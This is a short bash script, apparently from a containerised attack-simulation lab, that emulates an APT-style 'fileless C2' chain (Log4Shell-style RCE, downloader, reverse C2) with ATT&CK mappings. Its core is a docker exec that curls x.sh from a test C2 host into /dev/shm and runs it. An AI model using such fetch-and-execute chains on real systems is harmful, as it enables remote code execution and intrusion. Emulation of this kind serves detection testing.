#!/usr/bin/env bash
# S2 apt-fileless-c2（容器拓扑版）：Log4Shell 风格 RCE → 下载器 → 无文件落地反弹 C2。
# ATT&CK: T1190 → T1059 → T1105 → T1571。C2 固定测试网 10.66.0.99。
set -euo pipefail
C2="${C2:-10.66.0.99}"

docker exec node-a bash -c "
  set -e
  curl -s http://$C2:8080/x.sh -o /dev/shm/x.sh
  chmod +x /dev/shm/x.sh
  bash /dev/shm/x.sh
"
echo "[apt-fileless-c2] attack executed (container)"
